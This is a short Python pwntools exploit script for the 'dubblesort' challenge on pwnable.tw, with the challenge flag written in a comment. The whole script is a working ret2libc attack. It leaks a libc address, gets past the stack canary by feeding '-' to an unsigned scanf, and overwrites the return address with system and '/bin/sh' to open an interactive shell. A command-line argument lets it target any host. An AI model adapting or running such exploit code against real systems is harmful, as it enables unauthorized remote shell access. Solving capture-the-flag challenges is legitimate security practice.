from pwn import *
import sys

#return-to-libc attack(ret2libc)
#FLAG{Dubo_duBo_dub0_s0rttttttt}

port = 10101
elf = ELF('dubblesort')
libc = ELF('./libc_32.so.6')

def exploit(s):
    got_plt_offset = 0x1b0000
    s.recv()
    s.sendline(b'b' * 24)
    libc_addr = u32(s.recv()[30:34]) - 0xa
    print ('libc\t', hex(libc_addr))
    libcbase_addr = libc_addr - got_plt_offset
    print ('libcbase\t', hex(libcbase_addr))
    sys_addr = libcbase_addr + libc.symbols[b'system']
    print ('system\t', hex(libc.symbols[b'system']))
    bin_sh_addr = libcbase_addr + libc.search(b'/bin/sh').__next__()
    print ('binsh\t', hex(libc.search(b'/bin/sh').__next__()))
    s.sendline('35')
    # scanf("%u") need unsigned int to be valid
    # however, it also accepted +, -
    for i in range(24):
        s.sendlineafter(':', str(i))
    s.sendlineafter(':', '-') #use it to pass canary
    for _ in range(9):
        s.sendlineafter(':', str(sys_addr))
    s.sendlineafter(':', str(bin_sh_addr))
    s.interactive()
    #cat ./home/dubblesort/flag

if __name__ == '__main__':
    if len(sys.argv) == 1:
        s = remote('chall.pwnable.tw', port)
        exploit(s)

    else:
        s = remote(sys.argv[1], 1346)
        input('PAUSED')
        exploit(s)
